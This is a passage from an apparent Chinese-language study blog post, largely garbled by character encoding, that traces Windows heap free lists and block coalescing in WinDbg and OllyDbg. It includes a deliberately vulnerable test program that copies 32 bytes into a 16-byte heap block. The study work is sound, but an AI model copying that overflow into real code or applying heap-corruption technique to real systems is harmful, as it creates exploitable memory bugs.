    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ä¸åŒä¹‹å¤„æ˜¯3a0188å’Œ3a018cå¤„çš„003a0188å˜æˆäº†003a0688,è€Œ003a0688æ­£æ˜¯h1çš„å€¼,è€Œh1é‡Šæ”¾åå°†é“¾å…¥free[2]çš„ç©ºè¡¨,è¯´æ˜
    3a0188æ­£æ˜¯free[2]è¿™ä¸ªä½ç½®,é‚£ä¹ˆ3a0180å°±æ˜¯free[1]çš„ä½ç½®,ä¹Ÿå³ä»+0x178å¼€å§‹,æœ‰128ä¸ªå…ƒç´ ,æ¯ä¸ª8å­—èŠ‚å¤§å°,è¿™
    128ä¸ªå…ƒç´ æ„æˆä¸€ä¸ªæŒ‡é’ˆæ•°ç»„,è¿™ä¸ªæ•°ç»„å«åš"ç©ºè¡¨ç´¢å¼•",è¿™ä¸ªæ•°ç»„çš„æ¯ä¸€é¡¹åŒ…æ‹¬ä¸¤ä¸ªæŒ‡é’ˆ,æŒ‡é’ˆä»£è¡¨å¯¹åº”ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªç©º
    é—²å †å—çš„å†…å­˜åœ°å€.

f8
f8
...
(eip=40106e)
    åˆ°è¿™é‡Œh3é‡Šæ”¾å®Œ,ç”±äºh3ä¹Ÿæ˜¯ä¸¤ä¸ªå †å—å•å…ƒå¤§å°,æ‰€ä»¥h3ä¹Ÿå°†é“¾å…¥åˆ°free[2]çš„ç©ºè¡¨å½“ä¸­
    å¯ä»¥é¢„æµ‹:
    free[2]å¤„çš„003a0688(free[2]çš„ç¬¬ä¸€ä¸ªç©ºé—²å †å—çš„ç´¢å¼•)å¯¹åº”çš„å†…å­˜å€¼[003a0688]=h3=003a06a8,è€Œ
    [003a0688+4]=free[2]=3a0188,è€Œ[003a06a8]=free[2]=003a0188,[003a06a8+4]=003a0688,free[2]ä¸º3a0188,h3é‡Šæ”¾å
    [3a0188]=3a0688,[3a0188+4]=3a06a8

    å®é™…ç¡®å®å¦‚æ­¤,å®é™…æ•°æ®å¦‚ä¸‹:

    003A0680  02 00 08 00 AA 00 0D 00 A8 06 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  02 00 02 00 AE 00 0A 00 88 01 3A 00 88 06 3A 00  ..?..?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 A8 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    å¦‚ä¸‹å›¾:
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-3.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f8
f8
...
(eip=401078)
    åˆ°è¿™é‡Œh5é‡Šæ”¾å®Œ,ç”±äºh5å®é™…åˆ†é…å¤§å°ä¸º4ä¸ªå †å—å•å…ƒå¤§å°,h5å †å—é‡Šæ”¾åå°†é“¾å…¥free[4]ç©ºè¡¨ä¸­,free[4]=3a0198
    å¯ä»¥é¢„æµ‹:
    [3a0198]=h5=003a06c8,[3a0198+4]=h5=003a06c8
    [003a06c8]=3a0198,[003a06c8+4]=3a0198
    
    å®é™…æ•°æ®å¦‚ä¸‹:

    003A0190  90 01 3A 00 90 01 3A 00 C8 06 3A 00 C8 06 3A 00  ?:.?:.?:.?:.

    003A06C0  04 00 02 00 A2 00 0D 00 98 01 3A 00 98 01 3A 00  ..?..?:.?:.
    ä¸é¢„æµ‹ç»“æœä¸€è‡´

f8
f8
...
(eip=401082)
    åˆ°è¿™é‡Œh4é‡Šæ”¾å®Œ,ç”±äºh4å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å—å•å…ƒå¤§å°,h4å †å—é‡Šæ”¾åå°†é“¾å…¥free[2]ç©ºè¡¨ä¸­,free[2]=3a0188
    å¯ä»¥é¢„æµ‹:
    [free[2]]=[3a0188]=h1=3a0688,[3a0188+4]=h4=3a06b8
    [h1]=[3a0688]=h3=3a06a8,[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=h4=3a06b8,[3a06a8+4]=h1=3a0688
    [h4]=[3a06b8]=3a0188,[3a06b8+4]=h3=3a06a8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    ä¸å®é™…æ•°æ®å¹¶ä¸ä¸€è‡´,å› ä¸ºh4é‡Šæ”¾å®Œå,h3,h4,h5ä¸‰ä¸ªç©ºé—²å †å—ç›¸é‚»,ä¼šå‘ç”Ÿåˆå¹¶,3ä¸ªå †å—å¤§å°ä¸€å…±ä¸º2+2+4=8ä¸ªå †å•å…ƒå¤§å°,
    åˆå¹¶åå°†é“¾å…¥free[8]ç©ºè¡¨ä¸­(free[8]æ˜¯128ä¸ªç©ºè¡¨ä¸­çš„ç¬¬9ä¸ªç©ºè¡¨çš„ç´¢å¼•,ä¹Ÿå³0x3a0000+0x178+8*8=0x3a01b8)
    ,é¢„æµ‹:
    [free[8]]=[3a01b8]=h3=3a06a8(h3,h4,h5åˆå¹¶åç”±h3ç´¢å¼•)
    [free[2]]=[3a0188]=h1=3a0688(2ä¸ªå †å—å•å…ƒå¤§å°çš„ç©ºé—²å †åªå‰©ä¸‹h1,åŸæ¥æ˜¯h1,h3,h4)
    [h1]=[3a0688]=free[2]=3a0188,[h1+4]=[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=free[8]=3a01b8,[h3+4]=[3a06a8+4]=free[8]=3a01b8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A01B0  B0 01 3A 00 B0 01 3A 00 A8 06 3A 00 A8 06 3A 00  ?:.?:.?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    å¯è§,å®é™…æ•°æ®ä¸é¢„æµ‹ç»“æœå®Œå…¨ä¸€æ ·,æ­¤æ—¶[free[0]]=[0x3a0178]=3a0708(ä¸€ç›´ä¸å˜),3a0708å¤„æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å¯è§å½“å‰å †å—å¤§å°ä¸º0x120(ä¸ªå †å—å•å…ƒå¤§å°),ä¸Šä¸€ä¸ªå †å—å¤§å°ä¸º4?
    å¹¶ä¸æ˜¯è¿™æ ·,å› ä¸º0x178åç§»å¤„å¹¶ä¸æ˜¯å †å—,è€Œæ˜¯å¤§å°ä¸º128çš„æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæ•°ç»„çš„ä½ç½®,æ‰€ä»¥0x178-8å¹¶ä¸æ˜¯å—é¦–
    ,åç§»0x178æ˜¯free[0],ä¹Ÿå³free[0]=0x3a0178,è€Œåç§»0x178ä¸­å­˜æ”¾çš„å†…å®¹ä¹Ÿå³[free[0]]ä¸ºè¿™ä¸ªæŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
    çš„å€¼,è¿™ä¸ªå€¼æ˜¯ä¸ªæŒ‡é’ˆ,æŒ‡å‘free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—,æ­¤ä¾‹ä¸­free[0]ç©ºè¡¨åªæœ‰ä¸€ä¸ªå †å—,å †å—çš„ç´¢å¼•ä¸º3a0708,ä¹Ÿå³:
    [free[0]]=[3a0178]=3a0708,ä¸”[free[0]+4]=[3a0178+4]=3a0708
    è€Œ[3a0708]=[3a0708+4]=3a0178

ä½¿ç”¨å †çš„ä¸‰ç§æ–¹æ³•:
    a&gt;GetProcessHeapè·å¾—è¿›ç¨‹é»˜è®¤å †å¥æŸ„,HeapAlloc(è¿›ç¨‹é»˜è®¤å¥æŸ„)å¯ä»¥ä»é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´
    b&gt;å½¢å¦‚HeapCreate(0,0x1000,0x10000)åˆ›å»ºä¸å¯æ‰©å±•å †,å †å°†å¯ç”¨ç©ºè¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´
    c&gt;å½¢å¦‚HeapCreate(0,0,0)åˆ›å»ºå¯æ‰©å±•å †,å †å°†å¯ç”¨å¿«è¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´

    åœ¨æ­¤ä¾‹ä¸­,ç”±äºåœ¨åˆ›å»ºå †æ—¶ä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0x1000,0x10000),å¦‚æœä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0,0)å°†åˆ›å»ºå¯
    æ‰©å±•çš„å †,è¿™æ—¶å †ä¼šå¯ç”¨å¿«è¡¨,æŒ‡å‘å¿«è¡¨çš„æŒ‡é’ˆä½äºå †åç§»??å­—èŠ‚å¤„,0day2ä¹¦ä¸­åŒæ—¶æŒ‡å‡ºå¿«è¡¨ä½äº0x584å’Œ0x688åç§»å¤„,é€š
    è¿‡ä¸‹é¢ä»£ç çš„è°ƒè¯•æŸ¥çœ‹å¿«è¡¨çš„åç§»åœ¨å“ªé‡Œ:

    -----------find-lookaside---------------
    #include &lt;windows.h&gt;
    int main()
    {
    	HANDLE hp;
    	HLOCAL h1,h2,h3;
    	hp=HeapCreate(0,0,0);
    	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    	getchar();
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    
    	return 0;
    
    }
    ------------------end-------------------
    ç¼–è¯‘æˆreleaseç‰ˆæœ¬å,è¿è¡Œexe,windbgåŠ è½½
    dt _PEB @$pebæŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå—ä¿¡æ¯

    0:001&gt; dt _PEB @$peb
    ntdll!_PEB
       +0x000 InheritedAddressSpace : 0 ''
       +0x001 ReadImageFileExecOptions : 0 ''
       +0x002 BeingDebugged    : 0x1 ''
       +0x003 SpareBool        : 0 ''
       +0x004 Mutant           : 0xffffffff 
       +0x008 ImageBaseAddress : 0x00400000 
       +0x00c Ldr              : 0x00241e90 _PEB_LDR_DATA
       +0x010 ProcessParameters : 0x00020000 _RTL_USER_PROCESS_PARAMETERS
       +0x014 SubSystemData    : (null) 
       +0x018 ProcessHeap      : 0x00140000     ===&gt;è¿›ç¨‹å¯åŠ¨åˆ›å»ºçš„é»˜è®¤å †
       +0x01c FastPebLock      : 0x7c99d600 _RTL_CRITICAL_SECTION
       +0x020 FastPebLockRoutine : 0x7c921000 
       +0x024 FastPebUnlockRoutine : 0x7c9210e0 
       +0x028 EnvironmentUpdateCount : 1
       +0x02c KernelCallbackTable : (null) 
       +0x030 SystemReserved   : [1] 0
       +0x034 AtlThunkSListPtr32 : 0
       +0x038 FreeList         : (null) 
       +0x03c TlsExpansionCounter : 0
       +0x040 TlsBitmap        : 0x7c99d5c0 
       +0x044 TlsBitmapBits    : [2] 1
       +0x04c ReadOnlySharedMemoryBase : 0x7f6f0000 
       +0x050 ReadOnlySharedMemoryHeap : 0x7f6f0000 
       +0x054 ReadOnlyStaticServerData : 0x7f6f0688  -&gt; (null) 
       +0x058 AnsiCodePageData : 0x7ffa0000 
       +0x05c OemCodePageData  : 0x7ffa0000 
       +0x060 UnicodeCaseTableData : 0x7ffd1000 
       +0x064 NumberOfProcessors : 1
       +0x068 NtGlobalFlag     : 0
       +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000
       +0x078 HeapSegmentReserve : 0x100000
       +0x07c HeapSegmentCommit : 0x2000
       +0x080 HeapDeCommitTotalFreeThreshold : 0x10000
       +0x084 HeapDeCommitFreeBlockThreshold : 0x1000
       +0x088 NumberOfHeaps    : 5            ===&gt;è¿›ç¨‹ä¸­å…±æœ‰5ä¸ªå †
       +0x08c MaximumNumberOfHeaps : 0x10
       +0x090 ProcessHeaps     : 0x7c99cfc0  -&gt; 0x00140000    ===&gt;è¿›ç¨‹å †æŒ‡é’ˆæ•°æ®
       +0x094 GdiSharedHandleTable : (null) 
       +0x098 ProcessStarterHelper : (null) 
       +0x09c GdiDCAttributeList : 0
       +0x0a0 LoaderLock       : 0x7c99b178 
       +0x0a4 OSMajorVersion   : 5
       +0x0a8 OSMinorVersion   : 1
       +0x0ac OSBuildNumber    : 0xa28
       +0x0ae OSCSDVersion     : 0x300
       +0x0b0 OSPlatformId     : 2
       +0x0b4 ImageSubsystem   : 3
       +0x0b8 ImageSubsystemMajorVersion : 4
       +0x0bc ImageSubsystemMinorVersion : 0
       +0x0c0 ImageProcessAffinityMask : 0
       +0x0c4 GdiHandleBuffer  : [34] 0
       +0x14c PostProcessInitRoutine : (null) 
       +0x150 TlsExpansionBitmap : 0x7c99d5b8 
       +0x154 TlsExpansionBitmapBits : [32] 0
       +0x1d4 SessionId        : 0
       +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0
       +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0
       +0x1e8 pShimData        : (null) 
       +0x1ec AppCompatInfo    : (null) 
       +0x1f0 CSDVersion       : _UNICODE_STRING "Service Pack 3"
       +0x1f8 ActivationContextData : (null) 
       +0x1fc ProcessAssemblyStorageMap : (null) 
       +0x200 SystemDefaultActivationContextData : 0x00130000 
       +0x204 SystemAssemblyStorageMap : (null) 
       +0x208 MinimumStackCommit : 0

    +0x018å’Œ+0x088å¤„åˆ†åˆ«ä¸ºè¿›ç¨‹é»˜è®¤å †å’Œè¿›ç¨‹ä¸­å †çš„ä¸ªæ•°
    +0x090å¤„ä¸ºè¿›ç¨‹ä¸­æ‰€æœ‰å †çš„åœ°å€ç»„æˆçš„æŒ‡é’ˆæ•°ç»„

    dd 0x7c99cfc0æŸ¥çœ‹è¿›ç¨‹å †æ•°ç»„
    0:001&gt; dd 0x7c99cfc0
    7c99cfc0  00140000 00240000 00250000 00380000
    7c99cfd0  003a0000 00000000 00000000 00000000
    7c99cfe0  00000000 00000000 00000000 00000000
    7c99cff0  00000000 00000000 00000000 00000000

    æˆ–è€…!heap -hæŸ¥çœ‹æ‰€æœ‰å †çš„åœ°å€
    0:001&gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00140000 
        Segment at 00140000 to 00240000 (00004000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00006000 bytes committed)
      3:   00250000 
        Segment at 00250000 to 00260000 (00003000 bytes committed)
      4:   00380000 
        Segment at 00380000 to 00390000 (00002000 bytes committed)
      5:   003a0000 
        Segment at 003a0000 to 003e0000 (00003000 bytes committed)

    ä¸¤ç§æ–¹æ³•å¾—åˆ°çš„ç»“æœä¸€æ ·,å…¶ä¸­æœ€åä¸€ä¸ªå †çš„åœ°å€0x003a0000æ˜¯ä»£ç ä¸­HeapCreate(0,0,0)åˆ›å»ºå¾—åˆ°çš„å †åœ°å€

    dt _HEAP 0x3a0000æŸ¥çœ‹è¿™ä¸ªå †çš„ç»“æ„
    0:001&gt; dt _HEAP 0x3a0000
    ntdll!_HEAP
       +0x000 Entry            : _HEAP_ENTRY
       +0x008 Signature        : 0xeeffeeff
       +0x00c Flags            : 0x1002
       +0x010 ForceFlags       : 0
       +0x014 VirtualMemoryThreshold : 0xfe00
       +0x018 SegmentReserve   : 0x100000
       +0x01c SegmentCommit    : 0x2000
       +0x020 DeCommitFreeBlockThreshold : 0x200
       +0x024 DeCommitTotalFreeThreshold : 0x2000
       +0x028 TotalFreeSize    : 0x229
       +0x02c MaximumAllocationSize : 0x7ffdefff
       +0x030 ProcessHeapsListIndex : 5
       +0x032 HeaderValidateLength : 0x608
       +0x034 HeaderValidateCopy : (null) 
       +0x038 NextAvailableTagIndex : 0
       +0x03a MaximumTagIndex  : 0
       +0x03c TagEntries       : (null) 
       +0x040 UCRSegments      : (null) 
       +0x044 UnusedUnCommittedRanges : 0x003a0598 _HEAP_UNCOMMMTTED_RANGE
       +0x048 AlignRound       : 0xf
       +0x04c AlignMask        : 0xfffffff8
       +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x3a0050 - 0x3a0050 ]
       +0x058 Segments         : [64] 0x003a0640 _HEAP_SEGMENT
       +0x158 u                : __unnamed
       +0x168 u2               : __unnamed
       +0x16a AllocatorBackTraceIndex : 0
       +0x16c NonDedicatedListLength : 1
       +0x170 LargeBlocksIndex : (null) 
       +0x174 PseudoTagEntries : (null) 
       +0x178 FreeLists        : [128] _LIST_ENTRY [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x578 LockVariable     : 0x003a0608 _HEAP_LOCK
       +0x57c CommitRoutine    : (null) 
       +0x580 FrontEndHeap     : 0x003a0688 
       +0x584 FrontHeapLockCount : 0
       +0x586 FrontEndHeapType : 0x1 ''
       +0x587 LastSegmentIndex : 0 ''

    å¯ä»¥åœ¨0x178åç§»å¤„æ‰¾åˆ°free[0](0å·ç©ºè¡¨)

    dt _LIST_ENTRY 0x3a0178
    ntdll!_LIST_ENTRY
     [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x000 Flink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]
       +0x004 Blink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]

    dd 0x3a0688
    0:001&gt; dd 0x3a0688
    003a0688  00000000 00000000 01000004 00000000
    003a0698  00000000 00000000 00000000 00000000
    003a06a8  00000000 00000003 00000000 00000000
    003a06b8  00000000 00000000 01000004 00000000

    0x3a0000å †ä¸­èƒ½æ‰¾åˆ°0å·ç©ºè¡¨ä½†æ˜¯å´æ‰¾ä¸åˆ°å¿«è¡¨,0day2ä¸­è¯´çš„0x688å’Œ0x584åç§»å¤„å¹¶ä¸æ˜¯å¿«è¡¨çš„æ‰€åœ¨,å…³äºå¿«è¡¨çš„æ‰€åœ¨å’Œå‡º
    ç°æ¡ä»¶,æš‚æƒ‘ä¸å¾—è§£
</code></pre></div></div>

<h4 id="2æ¼æ´æˆ˜äº‰å®ä¾‹">2&gt;æ¼æ´æˆ˜äº‰å®ä¾‹</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ç³»ç»Ÿ:win7 x64+vc6.0

------------------heapoverflow.c---------------------
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int main()
{
    HANDLE hHeap;
    char *heap;
    char str[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    hHeap=HeapCreate(HEAP_GENERATE_EXCEPTIONS,0x1000,0xffff);
    getchar();

    heap=HeapAlloc(hHeap,0,0x10);
    printf("heap addr:0x%08x\n",heap);

    strcpy(heap,str);
    HeapFree(hHeap,0,heap);

    HeapDestroy(hHeap);
    return 0;
}
------------------------end--------------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬,ç”Ÿæˆäº†heapoverflow.exe,åŒå‡»exe,odé™„åŠ 
alt+e
    é€‰æ‹©å¯¹åº”exe,call getcharä¸‹é¢ä¸€å¥å¯¹åº”å¦‚ä¸‹æ±‡ç¼–ä»£ç 
    0040104b  |.  83c404        add     esp,4
    0040104B  |.  83C4 04       add esp,0x4
    0040104E  |&gt;  6A 10         push 0x10                                ; /dwBytes = 10 (16.)
    00401050  |.  6A 00         push 0x0                                 ; |dwFlags = 0
    00401052  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401053  |.  FF15 08604000 call dword ptr ds:[&lt;&amp;KERNEL32.HeapAlloc&gt;&gt;; \RtlAllocateHeap
    00401059  |.  8BD8          mov ebx,eax
    0040105B  |.  53            push ebx
    0040105C  |.  68 30704000   push heapover.00407030                   ;  ASCII "heap addr:0x%08x
    "
    00401061  |.  E8 4A000000   call heapover.004010B0
    00401066  |.  8D7C24 18     lea edi,dword ptr ss:[esp+0x18]
    0040106A  |.  83C9 FF       or ecx,-0x1
    0040106D  |.  33C0          xor eax,eax
    0040106F  |.  83C4 08       add esp,0x8
    00401072  |.  F2:AE         repne scas byte ptr es:[edi]
    00401074  |.  F7D1          not ecx                                  ;  heapover.00409E41
    00401076  |.  2BF9          sub edi,ecx                              ;  heapover.00409E41
    00401078  |.  53            push ebx                                 ; /pMemory = 7FFDD000
    00401079  |.  8BC1          mov eax,ecx                              ; |heapover.00409E41
    0040107B  |.  8BF7          mov esi,edi                              ; |
    0040107D  |.  8BFB          mov edi,ebx                              ; |
    0040107F  |.  6A 00         push 0x0                                 ; |Flags = 0
    00401081  |.  C1E9 02       shr ecx,0x2                              ; |
    00401084  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&gt;; |
    00401086  |.  8BC8          mov ecx,eax                              ; |
    00401088  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401089  |.  83E1 03       and ecx,0x3                              ; |
    0040108C  |.  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[&gt;; |
    0040108E  |.  FF15 04604000 call dword ptr ds:[&lt;&amp;KERNEL32.HeapFree&gt;] ; \HeapFree
    00401094  |.  55            push ebp                                 ; /hHeap = 003A0000
    00401095  |.  FF15 00604000 call dword ptr ds:[&lt;&amp;KERNEL32.HeapDestro&gt;; \HeapDestroy
    0040109B  |.  5F            pop edi                                  ;  heapover.00407068
    0040109C  |.  5E            pop esi                                  ;  heapover.00407068
    0040109D  |.  5D            pop ebp                                  ;  heapover.00407068
    0040109E  |.  33C0          xor eax,eax
    004010A0  |.  5B            pop ebx                                  ;  heapover.00407068
    004010A1  |.  83C4 24       add esp,0x24
    004010A4  \.  C3            retn

é€€å‡ºod
é‡æ–°è¿è¡Œheapoverflow.exe,windbgé™„åŠ 
bp 0x40104b
g
åœ¨exeä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦
windbgä¸­æ–­åœ¨æ–­ç‚¹å¤„:
    Breakpoint 0 hit
    eax=00000031 ebx=7efde000 ecx=00409e41 edx=00000101 esi=00407065 edi=0018ff49
    eip=0040104b esp=0018ff14 ebp=00870000 iopl=0         nv up ei pl nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    heapoverflow+0x104b:
    0040104b 83c404          add     esp,4
t
t
...
(eip=401053)
    æ­¤æ—¶è¿˜æ²¡æ‰§è¡ŒHeapAlloc(hHeap,0,0x10)
!heap -h
    0:000&gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00590000 
        Segment at 00590000 to 00690000 (00007000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00002000 bytes committed)
      3:   00870000 
        Segment at 00870000 to 00880000 (00001000 bytes committed)

dt _HEAP 870000
    +0x0c4 FreeLists        : _LIST_ENTRY [ 0x870590 - 0x870590 ] ==&gt;è¯´æ˜0x870590å¤„æ˜¯free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—
    æ­¤æ—¶free[0]ç©ºè¡¨åç§»ä¸å†æ˜¯0x178å¤„,è€Œæ˜¯0x0c4å¤„
dt _LIST_ENTRY 8700c4
    0:000&gt; dt _LIST_ENTRY 870590
    ntdll!_LIST_ENTRY
     [ 0x8700c4 - 0x8700c4 ]
       +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]
       +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]

t
    æ­¤æ—¶è¿›å…¥äº†HeapAllocå‡½æ•°å†…éƒ¨
shift+f11
    æ‰§è¡Œåˆ°è·³å‡ºHeapAllocå‡½æ•°(ç³»ç»Ÿé¢†åŸŸ)åˆ°å½“ä¸Šä¸€å±‚å‡½æ•°
(eip=401059)
    æ­¤æ—¶å †åˆ†é…å®Œæˆ
    dt _heap 870000
        +0x0c4 FreeLists        : _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    è¿™ä¸ªç»“æœè¡¨æ˜free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å¿«ä¸å†æ˜¯åŸæ¥çš„0x870590,è€Œå˜æˆäº†0x8705a8
    dt _LIST_ENTRY 8705a8
        0:000&gt; dt _LIST_ENTRY 8705a8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    æŸ¥çœ‹å¯„å­˜å™¨ä¹Ÿå¯ä»¥çœ‹åˆ°eax=870590(åŸæ¥çš„free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•å€¼),ä¹Ÿå³æºä»£ç ä¸­çš„heap=HeapAlloc(hHeap,0,0x10)
    åˆ†é…åˆ°çš„å †çš„ç´¢å¼•ä¸º870590,é‚£ä¹ˆheap_entryç»“æ„åœ¨870590-8=870588å¤„
    dt _HEAP_ENTRY 870590
        0:000&gt; dt _heap_entry 870590
        ntdll!_HEAP_ENTRY
           +0x000 Size             : 0xc4
           +0x002 Flags            : 0x87 ''
           +0x003 SmallTagIndex    : 0 ''
           +0x000 SubSegmentCode   : 0x008700c4 
           +0x004 PreviousSize     : 0xc4
           +0x006 SegmentOffset    : 0x87 ''
           +0x006 LFHFlags         : 0x87 ''
           +0x007 UnusedBytes      : 0 ''
           +0x000 FunctionIndex    : 0xc4
           +0x002 ContextValue     : 0x87
           +0x000 InterceptorValue : 0x8700c4
           +0x004 UnusedBytesLength : 0xc4
           +0x006 EntryOffset      : 0x87 ''
           +0x007 ExtendedBlockSignature : 0 ''
           +0x000 Code1            : 0x8700c4
           +0x004 Code2            : 0xc4
           +0x006 Code3            : 0x87 ''
           +0x007 Code4            : 0 ''
           +0x000 AgregateCode     : 0x8700c4`008700c4
    å‘ç°å‰ä¸¤ä¸ªå­—èŠ‚å¹¶ä¸æ˜¯3(HeapAllocåˆ†é…0x10+8=3*8å…±3ä¸ªå †å•å…ƒå¤§å°çš„ç©ºé—´),å¯¹ç…§æ³‰å“¥ä¹¦ä¸­çš„å‘½ä»¤,å‘ç°æŸ¥çœ‹å‘½ä»¤åº”è¯¥æ˜¯
    !heap -p -a 870588,è€Œä¸æ˜¯æˆ‘è®¤ä¸ºçš„dt _heap_entry 870590,åæ¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°åŒæ ·çš„é—®é¢˜,è¯´æ˜¯"nt6ä»¥å,heapç»“æ„
    å˜å¾—ä¸å°,dt heap_entryæ˜¯æ— æ³•çœ‹åˆ°çš„,è²Œä¼¼heap_entryåšäº†ç¼–ç "
        http://www.cppblog.com/ay19880703/archive/2011/10/30/159364.html
    äºæ˜¯ç”¨ä¹¦ä¸­çš„!heap -p -a 870588æŸ¥çœ‹heap_entryç»“æ„
    !heap -p -a 870588
        0:000&gt; !heap -p -a 870588
            address 00870588 found in
            _HEAP @ 870000
              HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
                00870588 0003 0000  [00]   00870590    00010 - (busy)
    èƒ½å¤Ÿæ­£å¸¸æŸ¥çœ‹heap_entryçš„ä¿¡æ¯,å½“å‰å †å—å¤§å°ä¸º3,ä¸Šä¸€å †å—å¤§å°ä¸º0
    !heap
        0:000&gt; !heap
        Index   Address  Name      Debugging options enabled
          1:   00590000                
          2:   00240000                
          3:   00870000 
    !heap -a 870000
        Heap entries for Segment00 in Heap 00870000
            00870000: 00000 . 00588 [101] - busy (587)
            00870588: 00588 . 00018 [101] - busy (10)
            008705a0: 00018 . 00a40 [100]
            00870fe0: 00a40 . 00020 [111] - busy (1d)
            00871000:      0000f000      - uncommitted bytes.
    ä»è¿™é‡Œçœ‹å‡ºheapå †çš„åœ°å€ä¸º870588,è€Œä¸æ˜¯870590,è¿™ä¸0day2ä¸­å †å—çš„ç´¢å¼•ä¸ºheap_entry(å ç”¨æ€)æˆ–è€…heap_free_entry
    (ç©ºé—²å †å—)çš„åœ°å€æœ‰ç‚¹ä¸åŒ,è¿™é‡Œçš„!heap -a 870000å¾—åˆ°çš„"entries"å¦‚æœç†è§£æˆ"ç´¢å¼•"ä¼šæŒ‡å‘heap_entry-8æˆ–è€…æ˜¯
    heap_free_entry-8çš„å †å—å—é¦–å¤„,è¿™é‡Œçš„entriesæŒ‰"å…¥å£"æ¥ç†è§£æ¯”è¾ƒå¥½,ä»ä¸Šé¢ä¹Ÿå¯çœ‹å‡º870588ä¸‹ä¸€ä¸ªå †å—æ˜¯ä¸ªç©ºé—²å †å—,
